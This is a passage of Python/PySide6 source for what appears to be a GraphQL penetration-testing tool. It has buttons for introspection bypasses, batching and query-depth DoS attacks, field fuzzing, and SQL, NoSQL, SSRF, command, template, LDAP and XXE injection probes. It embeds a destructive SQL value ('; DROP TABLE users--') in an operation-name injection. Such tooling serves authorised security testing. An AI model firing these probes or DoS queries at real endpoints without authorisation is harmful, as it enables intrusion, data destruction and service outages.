        self._fuzz_progress.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        row8.addWidget(self._fuzz_progress)
        row8.addStretch()
        lay.addLayout(row8)

        lay.addWidget(_sep())

        # ── INJECTION PROBES ──────────────────────────────────────────────────
        lay.addWidget(_sec_lbl("INJECTION PROBES", _YELLOW))

        row9 = QHBoxLayout()
        row9.setContentsMargins(6, 2, 6, 2)
        row9.setSpacing(6)
        f_lbl = QLabel("Field:")
        f_lbl.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        row9.addWidget(f_lbl)
        self._inj_field = QLineEdit()
        self._inj_field.setPlaceholderText("search")
        self._inj_field.setStyleSheet(_LINE)
        self._inj_field.setFixedWidth(90)
        row9.addWidget(self._inj_field)
        a_lbl = QLabel("Arg:")
        a_lbl.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        row9.addWidget(a_lbl)
        self._inj_arg = QLineEdit()
        self._inj_arg.setPlaceholderText("query")
        self._inj_arg.setStyleSheet(_LINE)
        self._inj_arg.setFixedWidth(80)
        row9.addWidget(self._inj_arg)
        row9.addStretch()
        lay.addLayout(row9)

        row10 = QHBoxLayout()
        row10.setContentsMargins(6, 2, 6, 2)
        row10.setSpacing(4)
        for label, kind in [
            ("SQL",      "sql"),
            ("NoSQL",    "nosql"),
            ("SSRF",     "ssrf"),
            ("Cmd",      "cmd"),
            ("Template", "template"),
            ("LDAP",     "ldap"),
            ("XXE",      "xxe"),
        ]:
            b = _btn(label, _BTN_PEACH)
            b.clicked.connect(lambda _=None, k=kind: self._on_inject(k))
            row10.addWidget(b)
        row10.addStretch()
        lay.addLayout(row10)

        lay.addWidget(_sep())

        # ── MISC ATTACKS ──────────────────────────────────────────────────────
        lay.addWidget(_sec_lbl("MISC ATTACKS", _PURPLE))

        row11 = QHBoxLayout()
        row11.setContentsMargins(6, 2, 6, 2)
        row11.setSpacing(6)
        for label, slot in [
            ("__typename",      self._on_typename),
            ("Op Name Inject",  self._on_op_name),
            ("Type Confusion",  self._on_type_confusion),
            ("Null Token Note", self._on_null_token),
        ]:
            b = _btn(label, _BTN)
            b.clicked.connect(slot)
            row11.addWidget(b)
        row11.addStretch()
        lay.addLayout(row11)

        lay.addWidget(_sep())

        # ── OUTPUT LOG ────────────────────────────────────────────────────────
        lay.addWidget(_sec_lbl("OUTPUT", _GREEN))

        self._output = QTextEdit()
        self._output.setReadOnly(True)
        self._output.setFont(QFont("Cascadia Code", 8))
        self._output.setStyleSheet(
            f"QTextEdit{{background:#0D1117;color:#A6E3A1;border:none;padding:6px;"
            f"font-family:'Cascadia Code',monospace;font-size:8px;}}"
        )
        self._output.setFixedHeight(220)
        lay.addWidget(self._output)

        row_out = QHBoxLayout()
        row_out.setContentsMargins(6, 2, 6, 4)
        row_out.setSpacing(6)
        copy_out = _btn("Copy Output", _BTN)
        copy_out.clicked.connect(self._on_copy_output)
        row_out.addWidget(copy_out)
        clr_out = _btn("Clear Log", _BTN)
        clr_out.clicked.connect(self._output.clear)
        row_out.addWidget(clr_out)
        row_out.addStretch()
        lay.addLayout(row_out)

        lay.addStretch()
        scroll.setWidget(inner)
        ol.addWidget(scroll, stretch=1)
        return outer

    # ── Schema context menu ───────────────────────────────────────────────────

    def _schema_ctx_menu(self, pos) -> None:
        item = self._schema_tree.itemAt(pos)
        if not item:
            return
        menu = QMenu(self)
        menu.setStyleSheet(
            f"QMenu{{background:{_SURFACE};color:{_TEXT};border:1px solid {_BORDER};"
            f"padding:2px;}}"
            f"QMenu::item:selected{{background:{_OVERLAY};}}"
        )
        copy_act = menu.addAction("Copy Name")
        chosen = menu.exec(self._schema_tree.mapToGlobal(pos))
        if chosen is copy_act:
            name = item.text(0).split(":")[0].split("(")[0].strip()
            QApplication.clipboard().setText(name)
            self._log(f"Copied: {name}")

    # ── internal helpers ──────────────────────────────────────────────────────

    def _endpoint(self) -> str:
        return self._endpoint_input.text().strip()

    def _log(self, msg: str) -> None:
        self._output.append(msg)

    def _send(self, query: str, label: str = "", as_get: bool = False,
              form_post: bool = False, raw_body: str = "") -> None:
        ep = self._endpoint()
        if not ep:
            self._log("[!] No endpoint set.")
            return
        if self._worker and self._worker.isRunning():
            self._log("[!] A request is already in progress.")
            return
        self._send_status.setText("Sending…")
        self._send_btn.setEnabled(False)
        self._log(f"\n{'─'*40}")
        if label:
            self._log(f"▶ {label}")
        self._log(f"  Endpoint: {ep}")
        if not raw_body:
            self._log(f"  Query: {query[:100]}{'…' if len(query) > 100 else ''}")

        self._worker = _GraphqlWorker(
            ep, query, self._vars_edit.toPlainText(),
            self._extra_headers, self._proxy_port,
            as_get=as_get, form_post=form_post, raw_body=raw_body,
        )
        self._worker.result.connect(self._on_worker_result)
        self._worker.error.connect(self._on_worker_error)
        self._worker.done.connect(self._on_worker_done)
        self._worker.start()

    def _on_worker_result(self, body: str) -> None:
        self._resp_edit.setPlainText(body)
        short = body[:200].replace("\n", " ")
        self._log(f"  ✓ Response: {short}{'…' if len(body) > 200 else ''}")
        # Try to populate schema tree automatically on introspection response
        try:
            j = json.loads(body)
            if "__schema" in str(body):
                _populate_schema_tree(self._schema_tree, j)
                self._last_schema_json = j
                self._log("  ✓ Schema tree populated.")
        except Exception:
            pass

    def _on_worker_error(self, err: str) -> None:
        self._resp_edit.setPlainText(f"Error:\n{err}")
        self._log(f"  ✗ Error: {err}")

    def _on_worker_done(self) -> None:
        self._send_btn.setEnabled(True)
        self._send_status.setText("")

    # ── introspection slots ───────────────────────────────────────────────────

    def _on_probe(self) -> None:
        q = _probe_query()
        self._query_edit.setPlainText(q)
        self._send(q, "Probing introspection…")

    def _on_full_dump(self) -> None:
        q = _full_introspection_query()
        self._query_edit.setPlainText(q)
        self._send(q, "Full schema introspection…")

    def _on_bypass_fragment(self) -> None:
        q = _bypass_fragment()
        self._query_edit.setPlainText(q)
        self._send(q, "Introspection bypass via Fragment")

    def _on_bypass_alias(self) -> None:
        q = _bypass_alias()
        self._query_edit.setPlainText(q)
        self._send(q, "Introspection bypass via Alias")

    def _on_bypass_get(self) -> None:
        q = self._query_edit.toPlainText().strip() or _probe_query()
        self._log(f"\n── Bypass via GET ──")
        self._log(f"  URL: {self._endpoint()}?query={urllib.parse.quote(q)[:80]}…")
        self._send(q, "Introspection bypass via GET", as_get=True)

    def _on_bypass_form(self) -> None:
        q = self._query_edit.toPlainText().strip() or _probe_query()
        self._send(q, "Introspection bypass via Form POST", form_post=True)

    # ── batch slots ───────────────────────────────────────────────────────────

    def _on_array_batch(self) -> None:
        q   = self._query_edit.toPlainText().strip() or _typename_probe()
        n   = self._batch_n.value()
        raw = _array_batch(q, n)
        self._log(f"\n── Array Batch (N={n}) ──")
        self._log(f"  Preview: {raw[:150]}…")
        self._query_edit.setPlainText(raw)
        self._send("", "Array batch attack", raw_body=raw)

    def _on_alias_batch(self) -> None:
        field = self._dos_root.text().strip() or "user"
        n     = self._batch_n.value()
        q     = _alias_batch(field, n)
        self._query_edit.setPlainText(q)
        self._send(q, f"Alias batch (N={n}, field={field})")

    def _on_fragment_batch(self) -> None:
        field = self._dos_root.text().strip() or "user"
        n     = self._batch_n.value()
        q     = _fragment_batch(field, n)
        self._query_edit.setPlainText(q)
        self._send(q, f"Fragment batch (N={n}, field={field})")

    # ── DoS slots ─────────────────────────────────────────────────────────────

    def _on_deep_query(self) -> None:
        root  = self._dos_root.text().strip() or "user"
        depth = self._dos_depth.value()
        q     = _deep_query(root, depth)
        self._query_edit.setPlainText(q)
        self._send(q, f"Deep query DoS (depth={depth}, root={root})")

    def _on_wide_query(self) -> None:
        root  = self._dos_root.text().strip() or "user"
        width = self._dos_width.value()
        q     = _wide_query(root, width)
        self._query_edit.setPlainText(q)
        self._send(q, f"Wide query DoS (width={width}, root={root})")

    def _on_recursive_frag(self) -> None:
        q = _recursive_fragment()
        self._query_edit.setPlainText(q)
        self._log("\n── Recursive Fragment (server-side parser stress) ──")
        self._log("  Note: circular fragments are spec-illegal; most servers reject them.")
        self._send(q, "Recursive fragment DoS")

    def _on_deprecated(self) -> None:
        q = _deprecated_fields_query()
        self._query_edit.setPlainText(q)
        self._send(q, "Deprecated field enumeration")

    # ── field fuzzing slots ───────────────────────────────────────────────────

    def _on_browse_wordlist(self) -> None:
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Wordlist", "", "Text files (*.txt);;All files (*)"
        )
        if path:
            self._wordlist_path = path
            self._wordlist_lbl.setText(Path(path).name)

    def _on_start_fuzz(self) -> None:
        ep = self._endpoint()
        if not ep:
            self._log("[!] No endpoint set.")
            return
        if not self._wordlist_path:
            self._log("[!] No wordlist selected.")
            return
        if self._fuzz_worker and self._fuzz_worker.isRunning():
            self._log("[!] Fuzz already running.")
            return
        self._fuzz_start_btn.setEnabled(False)
        self._fuzz_stop_btn.setEnabled(True)
        self._log(f"\n── Field Fuzzing ── type={self._fuzz_type.text()} ──")
        self._fuzz_worker = _FieldFuzzWorker(
            ep, self._fuzz_type.text().strip(),
            self._wordlist_path, self._extra_headers, self._proxy_port,
        )
        self._fuzz_worker.found.connect(self._on_fuzz_found)
        self._fuzz_worker.progress.connect(self._on_fuzz_progress)
        self._fuzz_worker.done.connect(self._on_fuzz_done)
        self._fuzz_worker.start()

    def _on_stop_fuzz(self) -> None:
        if self._fuzz_worker:
            self._fuzz_worker.stop()

    def _on_fuzz_found(self, field: str, evidence: str) -> None:
        self._log(f"  [+] FOUND: {field}")
        self._log(f"      {evidence}")

    def _on_fuzz_progress(self, msg: str) -> None:
        self._fuzz_progress.setText(msg)
        self._log(f"  {msg}")

    def _on_fuzz_done(self) -> None:
        self._fuzz_start_btn.setEnabled(True)
        self._fuzz_stop_btn.setEnabled(False)
        self._fuzz_progress.setText("Done")
        self._log("── Fuzzing complete ──")

    # ── injection slots ───────────────────────────────────────────────────────

    def _on_inject(self, kind: str) -> None:
        field = self._inj_field.text()
        arg   = self._inj_arg.text()
        q     = _injection_payload(field, arg, kind)
        self._query_edit.setPlainText(q)
        self._send(q, f"{kind.upper()} injection probe")

    # ── misc attack slots ─────────────────────────────────────────────────────

    def _on_typename(self) -> None:
        q = _typename_probe()
        self._query_edit.setPlainText(q)
        self._send(q, "__typename probe")

    def _on_op_name(self) -> None:
        q = _op_name_injection(
            self._query_edit.toPlainText().strip() or _typename_probe(),
            "'; DROP TABLE users--",
        )
        self._query_edit.setPlainText(q)
        self._log("\n── Operation Name Injection ──")
        self._log("  Injects SQL-like payload into operation name field.")
        self._send(q, "Operation name injection")

    def _on_type_confusion(self) -> None:
        field = self._inj_field.text() or "user"
        arg   = self._inj_arg.text()   or "id"
        q     = _type_confusion_query(field, arg)
        self._query_edit.setPlainText(q)
        v     = '{"val": "not-an-integer"}'
        self._vars_edit.setPlainText(v)
        self._log("\n── Type Confusion Attack ──")
        self._log(f'  Sending variable as String where Int expected: {v}')
        self._send(q, "Type confusion attack")

    def _on_null_token(self) -> None:
        self._log("\n── Null Token Attack ──")
        self._log("  Remove Authorization header from the Headers list (+Headers button)")
        self._log("  or set it to: Authorization: Bearer null")
        self._log("  Then resend your query to test unauthenticated access.")

    # ── toolbar actions ───────────────────────────────────────────────────────

    def _on_send_query(self) -> None:
        q = self._query_edit.toPlainText().strip()
        if not q:
            self._log("[!] Query is empty.")
            return
        self._send(q, "Manual query")

    def _on_send_to_repeater(self) -> None:
        ep = self._endpoint()
        if not ep:
            self._log("[!] No endpoint to build request from.")
            return
        parsed = urllib.parse.urlsplit(ep)
        host   = parsed.netloc
        path   = parsed.path or "/"
        scheme = parsed.scheme
        port   = "443" if scheme == "https" else "80"

        q    = self._query_edit.toPlainText().strip() or _typename_probe()
        v_raw = self._vars_edit.toPlainText().strip()
        body_dict: dict = {"query": q}
        try:
            if v_raw:
                body_dict["variables"] = json.loads(v_raw)
        except Exception:
            pass
        body = json.dumps(body_dict)

        hdrs: list[str] = [
            f"Host: {host}",
            "Content-Type: application/json",
            f"Content-Length: {len(body.encode())}",
            "Accept: application/json",
            "Connection: close",
        ]
        for pair in self._extra_headers:
            if len(pair) == 2 and pair[0].strip():
                hdrs.append(f"{pair[0]}: {pair[1]}")

        raw = f"POST {path} HTTP/1.1\n" + "\n".join(hdrs) + "\n\n" + body
        self.send_to_repeater.emit(raw)

    def _on_add_headers(self) -> None:
        from PySide6.QtWidgets import QDialog, QDialogButtonBox, QFormLayout
        dlg = QDialog(self)
        dlg.setWindowTitle("Custom Request Headers")
        dlg.setMinimumWidth(460)
        dlg.setStyleSheet(
            f"QDialog{{background:{_SURFACE};color:{_TEXT};}}"
            f"QLabel{{color:{_TEXT}; font-size:9px;}}"
        )
        lay = QVBoxLayout(dlg)
        info = QLabel("One 'Name: Value' header per line:")
        info.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        lay.addWidget(info)
        te = QTextEdit()
        te.setFont(QFont("Cascadia Code", 9))
        te.setStyleSheet(_EDIT)
        te.setPlainText(
            "\n".join(f"{k}: {v}" for k, v in self._extra_headers) if self._extra_headers else ""
        )
        lay.addWidget(te)
        bb = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        bb.setStyleSheet(_BTN)
        bb.accepted.connect(dlg.accept)
        bb.rejected.connect(dlg.reject)
        lay.addWidget(bb)
        if dlg.exec() == QDialog.DialogCode.Accepted:
            self._extra_headers = []
            for line in te.toPlainText().splitlines():
                line = line.strip()
                if ":" in line:
                    k, _, v = line.partition(":")
                    self._extra_headers.append([k.strip(), v.strip()])
            self._save_timer.start()
            self._log(f"  Headers updated ({len(self._extra_headers)} custom headers)")

    def _on_clear(self) -> None:
        self._endpoint_input.clear()
        self._query_edit.clear()
        self._vars_edit.clear()
        self._resp_edit.clear()
        self._schema_tree.clear()
        self._extra_headers = []
        self._output.clear()
        self._last_schema_json = {}

    def _on_copy_output(self) -> None:
        QApplication.clipboard().setText(self._output.toPlainText())
        self._log("  Output copied to clipboard.")
